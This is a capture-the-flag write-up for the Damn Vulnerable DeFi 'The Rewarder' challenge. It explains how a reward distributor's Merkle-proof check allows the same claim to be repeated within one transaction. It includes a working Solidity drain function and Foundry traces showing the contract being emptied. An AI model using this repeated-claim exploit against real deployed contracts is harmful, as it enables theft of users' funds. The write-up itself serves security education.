# Damn Vulnerable DeFi - The Rewarder - Solution Report

## Problem Analysis

### Contract Summary

The challenge centers on the `TheRewarderDistributor` contract, which is designed to distribute rewards in the form of Damn Valuable Tokens (DVT) and WETH. The main functionalities of this contract include:

1. `createDistribution`: Allows the creation of a new distribution for a specific token. It sets a Merkle root and the total amount to be distributed.

2. `claimRewards`: Enables users to claim rewards for multiple tokens in a single transaction. Users must provide proofs of their inclusion in the Merkle tree for each claim.

The contract uses Merkle proofs for efficient verification of claims and employs bitmaps to track which rewards have been claimed.

### Initial Setup

The challenge is initialized with the following key parameters:

- Total DVT distribution amount: 10 ether
- Total WETH distribution amount: 1 ether
- Alice's DVT claim amount: 2502024387994809 wei
- Alice's WETH claim amount: 228382988128225 wei

### Success Criteria

To successfully complete the challenge, the following conditions must be met:

DVT balance in the distributor contract should be less than 1e16 wei
WETH balance in the distributor contract should be less than 1e15 wei
The recovery account should receive all drained funds minus Alice's claims

## Vulnerability

The vulnerability in this challenge lies within the `claimRewards` function of the `TheRewarderDistributor` contract. The core issue is in the Merkle proof verification process, specifically in these lines:

```solidity
bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
bytes32 root = distributions[token].roots[inputClaim.batchNumber];

if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
```

The fundamental flaw is that the Merkle proof verification doesn't consider the accumulated claim amount. Instead, it only verifies that a single claim of a specific amount for a particular address is valid. This allows an attacker to repeatedly use the same valid proof to claim the same amount multiple times in a single transaction.

Additionally, the contract's attempt to prevent double-claiming is insufficient:

```solidity
if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
```

This check only prevents claiming the exact same set of batch numbers twice, but doesn't prevent multiple claims of the same batch number within a single claimRewards call.

These vulnerabilities combined allow an attacker to drain the contract by submitting multiple identical claims in one transaction, each passing the Merkle proof verification and accumulating the claim amount beyond the intended allocation.

## Attack Pattern

The attack exploits the vulnerability in the `claimRewards` function of the `TheRewarderDistributor` contract. The attack pattern follows these steps:

1. **Obtain Distribution Information:**

   - Retrieve the player's allocated amount and Merkle proof for both DVT and WETH from the distribution files.
   - This information is legitimate and would pass the Merkle proof verification.

2. **Prepare Multiple Claims:**

   - For each token (DVT and WETH):
     a. Calculate the maximum number of claims possible by dividing the total remaining amount in the distributor by the player's allocated amount.
     b. Create an array of identical claims, each containing:
     - Batch number: 0 (same for all claims)
     - Amount: The player's allocated amount
     - Token index: 0 for DVT, 1 for WETH
     - Proof: The legitimate Merkle proof obtained earlier

3. **Execute the Attack:**

   - Call the `claimRewards` function with the prepared array of claims for DVT.
   - The function will process each claim individually, and for each:
     - Verify the Merkle proof (which will pass)
     - Transfer the claimed amount to the attacker
   - Repeat the process for WETH.

4. **Transfer Drained Funds:**
   - After draining both DVT and WETH, transfer all the claimed tokens from the attacker's address to the designated recovery address.

## Proof of Concept (PoC)

The core implementation of the solution is in the `test_theRewarder` function of the `TheRewarderChallenge` contract. Here's a breakdown of the key components:

1. **Main attack function**

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    // Get player's distribution info for DVT
    (uint256 playerDvtAmount, bytes32[] memory dvtProof) =
        getDistributionInfo("/test/the-rewarder/dvt-distribution.json", player);

    // Get player's distribution info for WETH
    (uint256 playerWethAmount, bytes32[] memory wethProof) =
        getDistributionInfo("/test/the-rewarder/weth-distribution.json", player);

    // Drain DVT
    drainToken(IERC20(address(dvt)), playerDvtAmount, dvtProof);

    // Drain WETH
    drainToken(IERC20(address(weth)), playerWethAmount, wethProof);

    // Transfer drained tokens to recovery address
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

2. **Function to drain a specific token**

```solidity
function drainToken(IERC20 token, uint256 amount, bytes32[] memory proof) internal {
    uint256 remaining = distributor.getRemaining(address(token));
    uint256 repeatCount = remaining / amount;

    Claim[] memory claims = new Claim[](repeatCount);
    IERC20[] memory tokens = new IERC20[](1);
    tokens[0] = token;

    for (uint256 i = 0; i < repeatCount; i++) {
        claims[i] = Claim({batchNumber: 0, amount: amount, tokenIndex: 0, proof: proof});
    }

    distributor.claimRewards(claims, tokens);
}
```

3. **Foundry Traces**

```
    ├─ [519] DamnValuableToken::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 9991970238730241694 [9.991e18]
    ├─ [24874] DamnValuableToken::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 9991970238730241694 [9.991e18])
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 9991970238730241694 [9.991e18])
    │   └─ ← [Return] true
    ├─ [542] WETH::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 998938703105422020 [9.989e17]
    ├─ [24863] WETH::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 998938703105422020 [9.989e17])
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 998938703105422020 [9.989e17])
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(TheRewarderDistributor: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
    │   └─ ← [Return] 5527736881763497 [5.527e15]
    ├─ [0] VM::assertLt(5527736881763497 [5.527e15], 10000000000000000 [1e16], "Too much DVT in distributor") [staticcall]
    │   └─ ← [Return]
    ├─ [542] WETH::balanceOf(TheRewarderDistributor: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
    │   └─ ← [Return] 832913906449755 [8.329e14]
    ├─ [0] VM::assertLt(832913906449755 [8.329e14], 1000000000000000 [1e15], "Too much WETH in distributor") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 9991970238730241694 [9.991e18]
    ├─ [519] DamnValuableToken::balanceOf(TheRewarderDistributor: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
    │   └─ ← [Return] 5527736881763497 [5.527e15]
    ├─ [0] VM::assertEq(9991970238730241694 [9.991e18], 9991970238730241694 [9.991e18], "Not enough DVT in recovery account") [staticcall]
    │   └─ ← [Return]
    ├─ [542] WETH::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 998938703105422020 [9.989e17]
    ├─ [542] WETH::balanceOf(TheRewarderDistributor: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
    │   └─ ← [Return] 832913906449755 [8.329e14]
    ├─ [0] VM::assertEq(998938703105422020 [9.989e17], 998938703105422020 [9.989e17], "Not enough WETH in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
